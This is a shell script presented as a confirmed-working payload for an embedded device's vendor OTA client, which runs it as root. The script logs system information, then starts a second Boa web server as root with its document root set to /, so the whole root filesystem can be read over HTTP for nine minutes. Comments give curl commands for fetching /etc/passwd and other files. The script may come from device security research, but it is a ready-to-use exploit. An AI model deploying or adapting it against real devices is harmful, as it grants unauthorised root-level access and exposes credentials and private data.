#!/bin/sh
# OTA "unpacker" payload v3 - runs as root through the vendor OTA client.
#
# This file is served as `otaunpack`.  The vendor client downloads it to
# /tmp/otaunpack, chmods it 777 and executes it as root.  The file is a shell
# script, so the kernel starts /bin/sh through the shebang.
#
# Why a second Boa: the rootfs is very minimal.  In the tested build `busybox`
# existed but `telnetd`, `nc`, `httpd` and `wget` were not usable.  The vendor
# Boa binary is present and reliable, so we run a second instance with
# `DocumentRoot /` and get the complete root filesystem over HTTP.
#
# Status: LIVE CONFIRMED.  The device executed this payload as root and the
# root filesystem became readable over HTTP.
#
# Cleanup: the vendor client calls waitpid() on this script and runs
# `system("reboot")` afterwards.  Sleeping 540 seconds gives a working window,
# then `exit 0` lets the client reboot the device and restore normal service.
# Do not replace the sleep with an endless loop: the device would stay in
# waitpid() and be unreachable until a power cycle.

P=/tmp/ota_payload.log
: > $P 2>/dev/null
exec >>$P 2>&1

echo "=== START ==="
id
uname -a
cat /proc/cmdline
cat /proc/mounts
ls -la /

# One config per Boa instance.  `-c DIR` makes Boa read DIR/boa.conf.
# Port 80 is the normal web UI port; 8080 is a fallback in case something
# still holds 80 when this runs.
make_conf() {
  {
    echo "Port $1"
    echo "User 0"
    echo "Group 0"
    echo "ErrorLog /var/run/boa_ro_$1.log"
    echo "ServerName lollipop"
    echo "DocumentRoot /"
    echo "DirectoryIndex index.html"
    echo "KeepAliveMax 100"
    echo "KeepAliveTimeout 10"
    echo "MimeTypes /customer/res/boa/mime.types"
    echo "DefaultType text/plain"
    echo "CGIPath /bin:/usr/bin:/customer/res/boa/cgi-bin"
  } > "$2"
}
make_conf 80 /tmp/boa.conf
make_conf 8080 /var/run/boa.conf

# Prefer the vendor binary at the location seen in the /customer image, then
# try the usual system locations.
BOA=""
for c in /customer/boa /usr/sbin/boa /sbin/boa /usr/bin/boa; do
  [ -x "$c" ] && BOA="$c" && break
done
echo "BOA=$BOA"

"$BOA" -c /tmp >/tmp/boa80.out 2>&1 &
sleep 1
"$BOA" -c /var/run >/tmp/boa8080.out 2>&1 &
sleep 2
echo "boa start attempted"

# Read access for 9 minutes:
#   curl http://<device>/etc/passwd
#   curl http://<device>/proc/mounts
#   curl http://<device>/tmp/ota_payload.log
sleep 540
echo "=== END ==="
exit 0
